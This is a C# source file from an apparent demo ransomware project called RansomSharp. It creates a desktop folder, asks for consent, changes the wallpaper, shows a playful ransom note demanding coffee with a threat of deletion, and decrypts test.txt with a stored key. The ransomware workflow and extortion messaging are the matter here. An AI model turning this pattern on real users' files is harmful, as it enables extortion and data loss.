using RansomSharp.Encrypt;

namespace RansomSharp.Core.Service
{
    public class RansomService
    {
        private readonly FileManager _fileManager;
        private readonly WallpaperManager _wallpaperManager;

        public RansomService()
        {
            _fileManager = new FileManager();
            _wallpaperManager = new WallpaperManager();
        }

        public string CreateRansomDirectory()
        {
            string ransomDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "RansomSharp");
            Directory.CreateDirectory(ransomDir);
            return ransomDir;
        }

        public bool ShouldContinueRansomware()
        {
            System.Console.WriteLine("DISCLAIMER: This ransomware will only encrypt the test.txt file inside the RansomSharp folder (created on your desktop). Do you want to continue? Y/N");
            string response = System.Console.ReadLine().Trim().ToUpper();
            return response == "Y" || response == "YES";
        }

        public async Task RunRansomware(string ransomDir)
        {
            string wallpaperDir = _fileManager.PrepareFiles(ransomDir);
            await _wallpaperManager.SetWallpaper(wallpaperDir);

            System.Console.Clear();
            System.Console.WriteLine("All your files have been encrypted.");
            System.Console.WriteLine("Send me coffee within 24 Hours, and I'll return your files.");
            System.Console.WriteLine("If you have already paid, use the field below and paste the key.");
            System.Console.WriteLine("Remember not to close cmd or your PC will be DELETED. Good Luck! ;)");

            string answer = System.Console.ReadLine();
            string correctAnswer = File.ReadAllText(Path.Combine(ransomDir, "dontworry.txt"));

            if (answer == correctAnswer)
            {
                System.Console.Clear();
                System.Console.WriteLine("Congratulations, you've managed to bring your computer back. Come on, grab a coffee, you deserve it ;D");

                string encryptedContent = File.ReadAllText(Path.Combine(ransomDir, "test.txt"));
                string decryptedContent = EncryptionHelper.Decrypt(encryptedContent, correctAnswer);
                File.WriteAllText(Path.Combine(ransomDir, "test.txt"), decryptedContent);

                System.Console.WriteLine("Do not close this screen until you make sure you have already looked at the entire 'RansomSharp' folder as it will be deleted.");

                System.Console.ReadLine();
            }
            else
            {
                System.Console.Clear();
                System.Console.WriteLine("It was nice to meet you, buddy ;(");
            }

            _fileManager.DeleteRansomDirectory(ransomDir);
        }
    }
}
